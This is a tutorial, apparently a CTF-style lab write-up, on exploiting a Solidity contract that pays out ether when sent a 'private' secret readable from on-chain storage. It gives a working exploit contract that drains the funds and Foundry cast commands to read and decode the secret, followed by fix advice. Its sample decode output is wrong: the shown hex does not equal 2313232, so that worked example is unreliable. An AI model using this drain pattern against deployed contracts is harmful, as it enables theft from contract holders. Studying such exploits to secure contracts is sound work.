Smart Contract Bug Analysis and Exploitation Using Foundry
________________________________________
✅ Vulnerable Contract (Target)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract X {
    uint256 private secret = 2313232;

    constructor() payable {}

    fallback() external payable {
        // Require at least 32 bytes to decode uint256
        if (msg.data.length >= 32) {
            (uint256 num) = abi.decode(msg.data, (uint256));
            if (num == secret) {
                payable(msg.sender).transfer(10 ether);
            }
        }
    }

    receive() external payable {}
}
✅ Exploit Contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Exploit {
    address payable target;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() external {
        // Encoding the uint256 value (2313232)
        bytes memory payload = abi.encode(uint256(2313232));
        (bool success, ) = target.call{value: 0}(payload);
        require(success, "Call failed");
    }

    // Withdraw stolen ETH
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
________________________________________
🧠 Analysis of the Vulnerability
•	The secret value is marked private but is still stored on-chain.
•	Solidity's private keyword only restricts external contractual access, not visibility on the blockchain.
•	The fallback function processes msg.data and performs a transfer if the decoded data matches the private secret.
•	Any attacker who retrieves the value of secret from storage can exploit this logic to drain Ether.
________________________________________
🔐 Why It’s Vulnerable
•	Anyone can call the fallback() with abi.encode(2313232) and receive Ether if they decode the private storage slot.
•	The fallback logic creates an unintended entry point for attackers.
________________________________________
🛠️ Foundry Commands to Read Storage and Decode Secret
1.	Read storage slot (assuming secret is in slot 0):
cast storage <contract_address> 0
Example:
cast storage 0x1767c4ee77CAE15Cc616a44BbAB2838C5049B6f6 0
2.	Decode uint256 value from returned hex:
cast decode "uint256" <hex_value>
Example:
cast decode "uint256" 0x0000000000000000000000000000000000000000000000000000000000233e30
Output:
2313232
________________________________________
💥 How to Fix
•	Never store sensitive secrets on-chain.
•	Use cryptographic challenge/response patterns or off-chain validation.
•	Avoid allowing fallback functions to execute critical logic based on externally provided data.
________________________________________
🧪 Extra Tips
•	Always test contracts with potential exploit patterns.
•	Consider using Foundry fuzz tests to simulate unknown inputs.
________________________________________
✅ Summary
Issue	Description
Storage Leakage	secret is readable on-chain despite being private.
Entry Point	fallback() creates a dangerous execution path.
Exploit	Exploit contract encodes and calls with the secret to drain ETH.
________________________________________
📦 Tools Used
•	Foundry — for storage inspection and testing
•	cast CLI — to inspect bytecode, storage, and decode data
